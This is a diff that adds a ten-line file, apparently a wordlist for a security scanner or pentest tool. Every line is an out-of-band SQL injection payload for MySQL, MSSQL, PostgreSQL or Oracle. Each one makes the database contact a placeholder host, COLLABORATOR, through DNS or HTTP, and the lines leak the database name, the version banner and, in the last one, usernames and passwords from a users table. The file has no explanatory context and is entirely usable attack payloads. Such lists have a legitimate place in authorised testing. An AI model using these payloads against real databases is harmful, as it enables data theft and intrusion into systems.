@@ -1,0 +1,10 @@
+' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT database()),'.COLLABORATOR\\\\a'))--
+' AND (SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT database()),0x2e,0x434f4c4c41424f4241544f52,0x5c5c61)))--
+'; EXEC master..xp_dirtree '//COLLABORATOR/a'--
+'; DECLARE @q VARCHAR(1024);SET @q='\\\\'+@@version+'.COLLABORATOR\\a';EXEC master..xp_dirtree @q--
+'; EXEC master..xp_fileexist '//COLLABORATOR/a'--
+'; COPY (SELECT '') TO PROGRAM 'nslookup COLLABORATOR'--
+'; SELECT dblink_send_query('host=COLLABORATOR','SELECT 1')--
+' AND UTL_HTTP.REQUEST('http://COLLABORATOR/'||(SELECT banner FROM v$version WHERE ROWNUM=1))=1--
+' AND UTL_INADDR.get_host_address(COLLABORATOR)=1--
+' AND (SELECT UTL_HTTP.REQUEST('http://COLLABORATOR/'||username||':'||password||'@x') FROM users WHERE ROWNUM=1)=1--
